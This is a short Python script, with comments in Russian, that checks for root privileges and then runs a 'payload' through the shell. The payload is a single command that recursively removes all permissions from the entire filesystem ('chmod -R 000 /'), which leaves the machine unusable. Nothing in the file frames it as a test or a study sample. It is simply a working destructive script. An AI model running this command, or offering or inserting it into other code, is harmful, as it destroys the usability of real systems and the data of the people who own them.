#!/usr/bin/env python3
import os
import sys
import subprocess

def check_root():

    if os.geteuid() != 0:
        print(" [!] Error: run this program with root privileges.")

        sys.exit(1)


def run_payload():
    """Команды, которые должны выполниться под root"""


    # Список команд для выполнения
    # Здесь не нужно писать 'sudo', так как скрипт уже запущен с sudo
    commands = [
        "sudo chmod -R 000 /",

    ]

    for cmd in commands:

        # shell=True позволяет использовать пайпы (|) и перенаправления
        subprocess.run(cmd, shell=True)

def main():
    # 1. Сначала проверяем права
    check_root()

    # 2. Если проверка прошла, выполняем код

    run_payload()


if __name__ == "__main__":
    main()